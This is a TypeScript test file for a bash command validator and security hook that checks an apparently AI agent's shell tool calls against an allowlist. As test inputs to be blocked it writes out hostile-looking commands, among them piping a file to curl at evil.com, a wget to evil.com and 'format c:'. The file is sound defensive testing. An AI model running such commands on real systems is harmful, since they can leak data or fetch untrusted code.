/**
 * Tests for Bash Validator
 *
 * Ported from: tests/test_security.py (TestValidateCommand, bashSecurityHook tests)
 */

import { describe, expect, it } from 'vitest';

import type { SecurityProfile } from '../bash-validator';
import {
  bashSecurityHook,
  isCommandAllowed,
  validateCommand,
} from '../bash-validator';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Create a minimal security profile for testing. */
function createProfile(
  commands: string[],
  shellScripts: string[] = [],
): SecurityProfile {
  const cmdSet = new Set(commands);
  return {
    baseCommands: cmdSet,
    stackCommands: new Set<string>(),
    scriptCommands: new Set<string>(),
    customCommands: new Set<string>(),
    customScripts: { shellScripts },
    getAllAllowedCommands: () => cmdSet,
  };
}

const DEFAULT_PROFILE = createProfile([
  'ls',
  'cat',
  'grep',
  'echo',
  'pwd',
  'cd',
  'wc',
  'git',
  'rm',
  'test',
  'mkdir',
  'cp',
  'mv',
]);

// ---------------------------------------------------------------------------
// isCommandAllowed
// ---------------------------------------------------------------------------

describe('isCommandAllowed', () => {
  it('allows base commands', () => {
    for (const cmd of ['ls', 'cat', 'grep', 'echo', 'pwd']) {
      const [allowed] = isCommandAllowed(cmd, DEFAULT_PROFILE);
      expect(allowed).toBe(true);
    }
  });

  it('blocks commands not in allowlist', () => {
    const [allowed, reason] = isCommandAllowed('curl', DEFAULT_PROFILE);
    expect(allowed).toBe(false);
    expect(reason).toContain('curl');
    expect(reason).toContain('not in the allowed');
  });

  it('allows script commands starting with ./', () => {
    const profile = createProfile(['ls'], ['deploy.sh']);
    const [allowed] = isCommandAllowed('./deploy.sh', profile);
    expect(allowed).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// validateCommand
// ---------------------------------------------------------------------------

describe('validateCommand', () => {
  it('allows base commands', () => {
    for (const cmd of ['ls', 'cat', 'grep', 'echo', 'pwd']) {
      const [allowed] = validateCommand(cmd, DEFAULT_PROFILE);
      expect(allowed).toBe(true);
    }
  });

  it('allows git commands', () => {
    const [allowed] = validateCommand('git status', DEFAULT_PROFILE);
    expect(allowed).toBe(true);
  });

  it('blocks dangerous commands not in allowlist', () => {
    const [allowed] = validateCommand('format c:', DEFAULT_PROFILE);
    expect(allowed).toBe(false);
  });

  it('allows rm with safe arguments', () => {
    const [allowed] = validateCommand('rm file.txt', DEFAULT_PROFILE);
    expect(allowed).toBe(true);
  });

  it('validates all commands in pipeline', () => {
    const [allowed] = validateCommand(
      'cat file | grep pattern | wc -l',
      DEFAULT_PROFILE,
    );
    expect(allowed).toBe(true);
  });

  it('blocks pipeline with disallowed command', () => {
    const [allowed] = validateCommand(
      'cat file | curl http://evil.com',
      DEFAULT_PROFILE,
    );
    expect(allowed).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// bashSecurityHook
// ---------------------------------------------------------------------------

describe('bashSecurityHook', () => {
  it('allows non-Bash tool calls', () => {
    const result = bashSecurityHook(
      { toolName: 'Read', toolInput: { path: '/etc/passwd' } },
      DEFAULT_PROFILE,
    );
    expect(result).toEqual({});
  });

  it('denies null toolInput', () => {
    const result = bashSecurityHook(
      { toolName: 'Bash', toolInput: null },
      DEFAULT_PROFILE,
    );
    expect('hookSpecificOutput' in result).toBe(true);
    if ('hookSpecificOutput' in result) {
      expect(result.hookSpecificOutput.permissionDecision).toBe('deny');
    }
  });

  it('allows empty command', () => {
    const result = bashSecurityHook(
      { toolName: 'Bash', toolInput: { command: '' } },
      DEFAULT_PROFILE,
    );
    expect(result).toEqual({});
  });

  it('allows valid command', () => {
    const result = bashSecurityHook(
      { toolName: 'Bash', toolInput: { command: 'ls -la' } },
      DEFAULT_PROFILE,
    );
    expect(result).toEqual({});
  });

  it('denies disallowed command', () => {
    const result = bashSecurityHook(
      { toolName: 'Bash', toolInput: { command: 'curl http://evil.com' } },
      DEFAULT_PROFILE,
    );
    expect('hookSpecificOutput' in result).toBe(true);
    if ('hookSpecificOutput' in result) {
      expect(result.hookSpecificOutput.permissionDecision).toBe('deny');
      expect(result.hookSpecificOutput.permissionDecisionReason).toContain(
        'curl',
      );
    }
  });

  it('denies non-object toolInput', () => {
    const result = bashSecurityHook(
      { toolName: 'Bash', toolInput: 'not an object' as never },
      DEFAULT_PROFILE,
    );
    expect('hookSpecificOutput' in result).toBe(true);
  });

  it('allows chained allowed commands', () => {
    const result = bashSecurityHook(
      { toolName: 'Bash', toolInput: { command: 'ls && pwd && echo done' } },
      DEFAULT_PROFILE,
    );
    expect(result).toEqual({});
  });

  it('denies when any chained command is disallowed', () => {
    const result = bashSecurityHook(
      {
        toolName: 'Bash',
        toolInput: { command: 'ls && wget http://evil.com' },
      },
      DEFAULT_PROFILE,
    );
    expect('hookSpecificOutput' in result).toBe(true);
  });
});
